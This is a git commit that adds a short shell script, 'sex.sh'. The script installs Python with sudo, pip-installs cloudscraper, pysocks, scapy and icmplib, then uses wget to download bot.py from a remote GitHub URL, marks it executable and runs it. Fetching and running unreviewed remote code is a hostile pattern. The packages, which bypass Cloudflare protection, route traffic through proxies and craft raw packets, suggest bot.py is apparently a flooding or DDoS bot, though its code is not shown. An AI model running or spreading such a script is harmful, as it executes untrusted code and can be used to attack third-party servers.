4fd06946210d51724ef9cc1e61c5f6b49e0ce63a
Peppe12367 <153301057+Peppe12367@users.noreply.github.com>
2025-05-04 11:35:55 +0200

    Create sex.sh

---
+++ sex.sh
@@ -0,0 +1,5 @@
+sudo yum install python3 python3-pip -y
+pip install cloudscraper requests pysocks scapy icmplib 
+wget https://raw.githubusercontent.com/Peppe12367/sdas/refs/heads/main/bot.py
+chmod +x bot.py
+python3 bot.py
